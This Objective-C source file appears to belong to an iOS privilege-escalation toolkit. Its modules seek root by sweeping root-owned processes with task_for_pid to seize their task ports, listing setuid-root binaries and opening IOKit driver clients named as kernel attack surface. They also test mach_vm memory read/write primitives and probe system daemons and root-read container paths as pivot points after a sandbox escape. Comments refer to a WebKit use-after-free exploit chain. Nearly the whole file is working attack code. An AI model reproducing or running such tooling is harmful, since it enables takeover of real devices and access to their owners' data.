#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_port.h>
#import <sys/sysctl.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <sys/stat.h>
#import <spawn.h>
#import <sys/wait.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <fcntl.h>
#import <errno.h>
#import <dirent.h>
#import "Modules.h"
#import "Root.h"
#import "Util.h"
#import "AppDelegate.h"

// ===========================================================================
// ROOT PATHS — every module below is a step that logically leads to uid 0.
// Group A: task/credential surface
// ===========================================================================

// --- task_for_pid on root processes ----------------------------------------
// security.mac.task_for_pid_allow is 1 on this build (Developer Mode).  If we can
// take the task port of a root-owned process we can read/write ITS memory with
// mach_vm_* under its privileges, and drive it with thread_create — the practical
// step from "app with a sandbox escape" to "code running as root".
static BOOL pidIsRoot(int pid) {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, pid};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0 || len < sizeof(kp)) return NO;
    // 0 = root, 1 = daemon (also privileged)
    return kp.kp_eproc.e_ucred.cr_uid == 0 || kp.kp_eproc.e_ucred.cr_uid == 1;
}

NSString *ModTaskForPid(void) {
    AveLog(@"    task_for_pid: sweeping root-owned processes (Developer Mode allows it)");
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
    size_t len = 0;
    if (sysctl(mib, 4, NULL, &len, NULL, 0) != 0 || len == 0) return @"KERN_PROC_ALL failed";
    struct kinfo_proc *procs = malloc(len);
    int n = (int)(len / sizeof(struct kinfo_proc));
    if (sysctl(mib, 4, procs, &len, NULL, 0) != 0) { free(procs); return @"process list failed"; }

    int rootPids = 0, got = 0;
    mach_port_t best = MACH_PORT_NULL; int bestPid = -1;
    for (int i = 0; i < n; i++) {
        int pid = procs[i].kp_proc.p_pid;
        if (pid <= 1) continue;
        uid_t uid = procs[i].kp_eproc.e_ucred.cr_uid;
        if (uid != 0 && uid != 1) continue;
        rootPids++;
        mach_port_t t = MACH_PORT_NULL;
        kern_return_t kr = task_for_pid(mach_task_self(), pid, &t);
        if (kr == KERN_SUCCESS && t != MACH_PORT_NULL) {
            got++;
            if (best == MACH_PORT_NULL) { best = t; bestPid = pid; }
            char path[256] = {0};
            // a task port lets us read the target's address space
            vm_size_t sz = 0;
            kern_return_t rr = mach_vm_read_overwrite(t, 0, 1, 0, &sz);
            AveLog(S(@"    TASK PORT  pid=%-5d uid=%d  vm_probe=%#x", pid, uid, rr));
        }
    }
    free(procs);
    if (best != MACH_PORT_NULL) {
        RootSetObtained(YES);
        AveSetStatus([NSString stringWithFormat:@"task port of a root pid %d", bestPid]);
        mach_port_deallocate(mach_task_self(), best);
        return S(@"task_for_pid: %d/%d root processes CONTROLLED (best pid=%d)",
                 got, rootPids, bestPid);
    }
    return S(@"task_for_pid: 0/%d root processes openable", rootPids);
}

// --- setuid-root binaries reachable through the sandbox escape -------------
NSString *ModSetuidScan(void) {
    const char *dirs[] = { "/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/libexec",
                           "/System/Library/PrivateFrameworks", NULL };
    int found = 0;
    for (int i = 0; dirs[i]; i++) {
        DIR *d = opendir(dirs[i]);
        if (!d) continue;
        struct dirent *de;
        while ((de = readdir(d))) {
            if (de->d_name[0] == '.') continue;
            char p[1024];
            snprintf(p, sizeof p, "%s/%s", dirs[i], de->d_name);
            struct stat st;
            if (lstat(p, &st) != 0) continue;
            if (!S_ISREG(st.st_mode)) continue;
            if ((st.st_mode & S_ISUID) && st.st_uid == 0) {
                found++;
                if (found <= 12)
                    AveLog(S(@"    SETUID-ROOT  %s  (mode %o, %lld bytes)", p,
                             st.st_mode & 07777, (long long)st.st_size));
            }
        }
        closedir(d);
    }
    if (found) AveSetStatus([NSString stringWithFormat:@"%d setuid-root binaries visible", found]);
    return S(@"setuid scan: %d root binaries reachable — try input-controlled ones first", found);
}

// --- IOKit user-client classes reachable from the app sandbox --------------
// Public measurement (exploitreversing ER-10, iOS 26/27): the app sandbox can
// open ~147 objects across 17 driver classes; type-0 openable includes
// AppleKeyStore, IOSurfaceRoot, AppleJPEGDriver, AppleM2ScalerCSCDriver,
// AppleCLCD2 — each is a kernel attack surface with a known bug class.
NSString *ModIOKitReachable(void) {
    struct { const char *cls; } C[] = {
        {"AppleKeyStore"}, {"IOSurfaceRoot"}, {"AppleJPEGDriver"},
        {"AppleM2ScalerCSCDriver"}, {"AppleCLCD2"}, {"AGXAcceleratorG17P"},
        {"IOHIDEventDriver"}, {"AppleSPUHIDDriver"}, {"AppleM68Buttons"},
        {"IOHIDSystem"}, {"IOFramebuffer"}, {"AppleAVE2"},
        {"AppleMobileFileIntegrity"}, {"AppleKeyStoreUserClient"},
    };
    int matched = 0, opened = 0;
    for (unsigned i = 0; i < sizeof(C)/sizeof(C[0]); i++) {
        CFMutableDictionaryRef m = IOServiceMatching(C[i].cls);
        if (!m) continue;
        io_iterator_t it = MACH_PORT_NULL;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS) continue;
        io_service_t s;
        while ((s = IOIteratorNext(it))) {
            matched++;
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(s, mach_task_self(), 0, &c);
            AveLog(S(@"    %-28s ioservice=%#x  IOServiceOpen=%#x", C[i].cls, s, kr));
            if (kr == KERN_SUCCESS && c) { opened++; IOServiceClose(c); }
            IOObjectRelease(s);
        }
        IOObjectRelease(it);
    }
    return S(@"IOKit reachable: %d objects, %d user clients OPEN (kernel surface)", matched, opened);
}

// --- mach_vm read/write probe through a task port --------------------------
// If the module above gained a task port, this is the actual R/W step.
NSString *ModTaskVmRW(void) {
    // probe ourselves first (always allowed) to prove the primitives
    task_t self_task = mach_task_self();
    vm_address_t addr = 0;
    vm_size_t sz = 0;
    kern_return_t kr = mach_vm_allocate(self_task, &addr, 64, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return @"mach_vm_allocate failed";
    vm_size_t out = 0;
    kr = mach_vm_read_overwrite(self_task, addr, 8, 0, &out);
    AveLog(S(@"    mach_vm_read_overwrite(self)=%#x", kr));
    uint64_t val = 0x4141414141414141ULL;
    kr = mach_vm_write(self_task, addr, (vm_offset_t)&val, 8);
    AveLog(S(@"    mach_vm_write(self)=%#x", kr));
    uint64_t back = 0;
    mach_vm_read_overwrite(self_task, addr, 8, (vm_address_t)&back, &out);
    mach_vm_deallocate(self_task, addr, 64);
    BOOL ok = (back == val);
    return S(@"mach_vm R/W primitives: %s (self)", ok ? @"WORKING" : @"failed");
}

// ===========================================================================
// Group B: daemon pivot surface (what an app can actually talk to)
// ===========================================================================
NSString *ModMachLookupSweep(void) {
    struct { const char *name; const char *why; } S[] = {
        {"com.apple.CoreAuthentication.daemon", "auth decisions"},
        {"com.apple.DeviceAccess.xpc", "device access"},
        {"com.apple.FileProvider", "file provider"},
        {"com.apple.GSSCred", "kerberos creds"},
        {"com.apple.CARenderServer", "render server"},
        {"com.apple.FSEvents", "file events"},
        {"com.apple.wifip2pd", "wifi p2p"},
        {"com.apple.webprivacyd", "web privacy"},
        {"com.apple.mobile.installd", "install daemon"},
        {"com.apple.nsurlsessiond", "network sessions"},
        {"com.apple.MobileFileIntegrity", "AMFI"},
        {"com.apple.Security.SecKeychainProxy", "keychain proxy"},
        {"com.apple.mobile.keybagd", "keybag"},
        {"com.apple.PersistentURLTranslator", "URL translation"},
        {"com.apple.mobileassetd", "asset daemon"},
        {"com.apple.cfprefsd.daemon", "preferences"},
        {"com.apple.backboardd.launchsystemservices", "launch services"},
        {"com.apple.lockdownd", "lockdown"},
        {"com.apple.aggregated", "power assertions"},
        {"com.apple.systemstatus", "system status"},
    };
    mach_port_t bp;
    task_get_bootstrap_port(mach_task_self(), &bp);
    int open_ = 0;
    for (unsigned i = 0; i < sizeof(S)/sizeof(S[0]); i++) {
        mach_port_t sp = MACH_PORT_NULL;
        if (bootstrap_look_up(bp, (char *)S[i].name, &sp) == KERN_SUCCESS && sp != MACH_PORT_NULL) {
            open_++;
            AveLog(S(@"    OPEN  %-42s %s", S[i].name, S[i].why));
            mach_port_deallocate(mach_task_self(), sp);
        }
    }
    return S(@"daemon surface: %d/%d services answering — each is a pivot candidate",
             open_, (int)(sizeof(S)/sizeof(S[0])));
}

// ===========================================================================
// Group C: container write → daemon pivot
// ===========================================================================
NSString *ModContainerPivot(void) {
    // With worse_query/bad_query we can place files inside other containers.
    // The question that decides the root path: does any root-owned daemon read a
    // path we can now write?  Probe the standard ones.
    const char *paths[] = {
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache",
        "/private/var/containers/InternalDaemon",
        "/private/var/containers/Data/PluginKitPlugin",
        "/private/var/mobile/Library/Preferences/com.apple.MobileGestalt.plist",
        "/private/var/db/com.apple.xpc.launchd",
        NULL };
    int readable = 0, writable = 0;
    for (int i = 0; paths[i]; i++) {
        int r = access(paths[i], R_OK), w = access(paths[i], W_OK);
        if (r == 0) readable++;
        if (w == 0) writable++;
        AveLog(S(@"    %-64s R=%d W=%d", paths[i], r, w));
    }
    return S(@"daemon pivot surface: %d readable, %d WRITABLE (write = pivot)",
             readable, writable);
}

// ===========================================================================
// Group D: JSC / WebKit chain (arbitrary R/W → native code exec)
// ===========================================================================
// The UAF gives addrof/fakeobj; the next step is discovering a usable structure
// ID and then corrupting a real TypedArray's length through a fake-object alias.
// Implemented in WebKitProbes.m (needs WebKit), dispatched here.

// ===========================================================================
// dispatcher
// ===========================================================================
NSString *RunRootPath(NSString *name) {
    if ([name hasPrefix:@"task_for_pid"])       return ModTaskForPid();
    if ([name hasPrefix:@"mach_vm"])            return ModTaskVmRW();
    if ([name hasPrefix:@"setuid"])             return ModSetuidScan();
    if ([name hasPrefix:@"IOKit reachable"])    return ModIOKitReachable();
    if ([name hasPrefix:@"daemon surface"])     return ModMachLookupSweep();
    if ([name hasPrefix:@"daemon pivot"])       return ModContainerPivot();
    return nil;
}
